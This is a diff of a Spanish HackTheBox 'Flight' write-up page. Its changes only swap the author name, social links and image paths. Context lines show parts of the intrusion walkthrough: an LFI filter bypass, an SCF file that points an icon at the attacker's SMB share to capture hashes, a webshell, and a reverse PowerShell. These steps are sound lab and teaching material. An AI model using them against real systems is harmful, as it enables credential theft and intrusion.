@@ -9,7 +9,7 @@
   <title>Writeup HackTheBox Flight</title>
 
   <meta name="description" content="Resolución de la máquina Flight de la plataforma de HackTheBox">
-  <meta name="author" content="GatoGamer1155">
+  <meta name="author" content="xchg2pwn">
   <meta name="HandheldFriendly" content="True">
   <meta name="MobileOptimized" content="320">
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -18,17 +18,17 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Writeup HackTheBox Flight">
   <meta name="twitter:description" content="Resolución de la máquina Flight de la plataforma de HackTheBox">
-  <meta name="twitter:creator" content="GatoGamer1155">  
-  <meta name="twitter:image" content="/images/htb/flight.png" />
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/hackthebox/flight.png" />
 
-  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:site_name" content="xchg2pwn" />
   <meta property="og:type" content="article">
   <meta property="og:title" content="Writeup HackTheBox Flight">
   <meta property="og:description" content="Resolución de la máquina Flight de la plataforma de HackTheBox">
-  <meta property="og:image" content="/images/htb/flight.png" />
+  <meta property="og:image" content="/images/hackthebox/flight.png" />
 
   <link rel="manifest" href="/images/favicons/manifest.json">
-  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/flight.png">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/flight.png">
 
   <meta name="msapplication-TileColor" content="#ffc40d">
   <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
@@ -55,17 +55,17 @@
     <div class="panel-main__inner panel-inverted">
       <div class="panel-main__content">
 
-          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
-          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
 
         <hr class="panel-cover__divider">
-        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
         <hr class="panel-cover__divider panel-cover__divider--secondary">
 
         <div class="navigation-wrapper">
          <nav class="cover-navigation cover-navigation--primary">
             <ul class="navigation">
-              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+              <li class="navigation__item grow"><a href="/hackthebox" title="xchg2pwn" class="blog-button">HackTheBox</a></li>
             </ul>
           </nav>
 
@@ -73,35 +73,35 @@
             <ul class="navigation">
               
               <li class="navigation__item grow">
-                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                   <i class="icon icon-social-github"></i>
                   <span class="label">GitHub</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                   <i class="icon icon-social-twitter"></i>
                   <span class="label">Twitter</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                   <i class="icon icon-social-instagram"></i>
                   <span class="label">Instagram</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                   <i class="icon icon-social-youtube"></i>
                   <span class="label">Youtube</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                   <i class="icon icon-mail"></i>
                   <span class="label">Email</span>
                 </a>
@@ -137,7 +137,7 @@
 
   <header class="post-header slide-top">
     <h4 class="post-title">HackTheBox</h4>
-    <picture><img src="/images/htb/flight.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <picture><img src="/images/hackthebox/flight.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
     <h2 class="post-title">Flight</h2><br>
   </header>
   
@@ -183,7 +183,7 @@ PORT      STATE SERVICE
 </code></pre></div></div><br>
 
 <p class="plain-text">Sabemos que corre un servicio <code class="language-plaintext highlighter-rouge">http</code>, si lo vemos desde la web encontramos una <code class="language-plaintext highlighter-rouge">pagina</code> donde realmente no encontramos absolutamente nada de <code class="language-plaintext highlighter-rouge">interes</code></p>
-<a href="/htb/flight/1.png" target="_blank"><div><p><img src="/htb/flight/1.png"></p></div></a>
+<a href="/hackthebox/flight/1.png" target="_blank"><div><p><img src="/hackthebox/flight/1.png"></p></div></a>
 
 <p class="plain-text">Al usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para con un diccionario aplicar fuerza bruta y asi descubrir posibles <code class="language-plaintext highlighter-rouge">subdominios</code> sobre el dominio <code class="language-plaintext highlighter-rouge">flight.htb</code> encontramos uno diferente y es <code class="language-plaintext highlighter-rouge">school</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -208,7 +208,7 @@ ID           Response   Lines    Word       Chars       Payload
 </code></pre></div></div><br>
 
 <p class="plain-text">Al abrir la web desde el <code class="language-plaintext highlighter-rouge">subdominio</code> encontramos una <code class="language-plaintext highlighter-rouge">página</code> diferente que parece tener la temática de escuela de aviacion, tambien vemos algunas <code class="language-plaintext highlighter-rouge">pestañas</code></p>
-<a href="/htb/flight/2.png" target="_blank"><div><p><img src="/htb/flight/2.png"></p></div></a>
+<a href="/hackthebox/flight/2.png" target="_blank"><div><p><img src="/hackthebox/flight/2.png"></p></div></a>
 
 </section>
 
@@ -216,13 +216,13 @@ ID           Response   Lines    Word       Chars       Payload
 <br><h3 class="post-title">Access - svc_apache</h3><br>
 
 <p class="plain-text">Haciendo clic en cualquiera de las <code class="language-plaintext highlighter-rouge">pestañas</code> que existen, podemos ver que gestiona las paginas con un <code class="language-plaintext highlighter-rouge">html</code> mediante el parametro <code class="language-plaintext highlighter-rouge">view</code> desde el <code class="language-plaintext highlighter-rouge">index.php</code></p>
-<a href="/htb/flight/3.png" target="_blank"><div><p><img src="/htb/flight/3.png"></p></div></a>
+<a href="/hackthebox/flight/3.png" target="_blank"><div><p><img src="/hackthebox/flight/3.png"></p></div></a>
 
 <p class="plain-text">Intentamos acceder al archivo <code class="language-plaintext highlighter-rouge">hosts</code> para leerlo mediante un <code class="language-plaintext highlighter-rouge">LFI</code> pero nos dice que se ha detectado una actividad <code class="language-plaintext highlighter-rouge">sospechosa</code>, parece que no le gusta un <code class="language-plaintext highlighter-rouge">caracter</code></p>
-<a href="/htb/flight/7.png" target="_blank"><div><p><img src="/htb/flight/7.png"></p></div></a>
+<a href="/hackthebox/flight/7.png" target="_blank"><div><p><img src="/hackthebox/flight/7.png"></p></div></a>
 
 <p class="plain-text">Parece que el caracter que esta en una blacklist es <code class="language-plaintext highlighter-rouge">\</code> podemos simplemente cambiarlo por <code class="language-plaintext highlighter-rouge">/</code> y leer el contenido del archivo <code class="language-plaintext highlighter-rouge">hosts</code> o cualquier otro existente</p>
-<a href="/htb/flight/8.png" target="_blank"><div><p><img src="/htb/flight/8.png"></p></div></a>
+<a href="/hackthebox/flight/8.png" target="_blank"><div><p><img src="/hackthebox/flight/8.png"></p></div></a>
 
 <p class="plain-text">Es vulnerable a <code class="language-plaintext highlighter-rouge">LFI</code> pero tambien se podria probar un <code class="language-plaintext highlighter-rouge">RFI</code> por si podemos acceder a un servidor <code class="language-plaintext highlighter-rouge">smb</code> externo que nosotros crearemos con <code class="language-plaintext highlighter-rouge">smbserver</code> de impacket</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -397,7 +397,7 @@ drw-rw-rw-          0  Thu May  4 08:22:01 2023 js</span>
 <section class="post" id="access-c.bum">
 <br><h3 class="post-title">Access - c.bum</h3><br>
 
-<p class="plain-text">Un posible ataque como en <a href="/htb/driver/">Driver</a> es cargar un archivo <code class="language-plaintext highlighter-rouge">scf</code> para cuando un usuario intente ver el <code class="language-plaintext highlighter-rouge">icono</code> este se carge de un recurso <code class="language-plaintext highlighter-rouge">smb</code> externo que crearemos</p>
+<p class="plain-text">Un posible ataque como en <a href="/hackthebox/driver/">Driver</a> es cargar un archivo <code class="language-plaintext highlighter-rouge">scf</code> para cuando un usuario intente ver el <code class="language-plaintext highlighter-rouge">icono</code> este se carge de un recurso <code class="language-plaintext highlighter-rouge">smb</code> externo que crearemos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">[</span><span class="na">Shell</span><span class="p">]
 </span><span class="o">IconFile</span><span class="p">=</span><span class="s">\\10.10.14.10\kali\pwned.ico  </span>
@@ -596,7 +596,7 @@ server: session#1: tun: proxy#R:8000=>8000: Listening</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ahora podemos ingresar a la web desde nuestro <code class="language-plaintext highlighter-rouge">localhost</code> con el puerto <code class="language-plaintext highlighter-rouge">8000</code></p>
-<a href="/htb/flight/6.png" target="_blank"><div><p><img src="/htb/flight/6.png"></p></div></a>
+<a href="/hackthebox/flight/6.png" target="_blank"><div><p><img src="/hackthebox/flight/6.png"></p></div></a>
 
 <p class="plain-text">Con <code class="language-plaintext highlighter-rouge">icacls</code> listamos los <code class="language-plaintext highlighter-rouge">permisos</code> de la ruta donde esta montado el servidor, podemos ver que el usuario <code class="language-plaintext highlighter-rouge">C.Bum</code> tiene acceso de <code class="language-plaintext highlighter-rouge">escritura</code> en ese directorio</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -663,10 +663,10 @@ PS C:\inetpub\development></span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Desde la webshell podemos ejecutar <code class="language-plaintext highlighter-rouge">comandos</code> como el usuario <code class="language-plaintext highlighter-rouge">defaultapppool</code></p>
-<a href="/htb/flight/4.png" target="_blank"><div><p><img src="/htb/flight/4.png"></p></div></a>
+<a href="/hackthebox/flight/4.png" target="_blank"><div><p><img src="/hackthebox/flight/4.png"></p></div></a>
 
 <p class="plain-text">Simplemente ejecutamos el <code class="language-plaintext highlighter-rouge">shell.exe</code> para enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code></p>
-<a href="/htb/flight/5.png" target="_blank"><div><p><img src="/htb/flight/5.png"></p></div></a>
+<a href="/hackthebox/flight/5.png" target="_blank"><div><p><img src="/hackthebox/flight/5.png"></p></div></a>
 
 <p class="plain-text">Al recibirla podemos ver que corre nos dice que la <code class="language-plaintext highlighter-rouge">powershell</code> la corre como el usuario <code class="language-plaintext highlighter-rouge">G0$</code>, quiere decir que al autenticarse este lo hace como la <code class="language-plaintext highlighter-rouge">máquina</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -858,7 +858,7 @@ PS C:\></span>
 </article>
   </div>
   <footer class="footer">
-    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
   </footer><br><br>
 
 <script type="text/javascript" src="/js/jquery.min.js"></script>
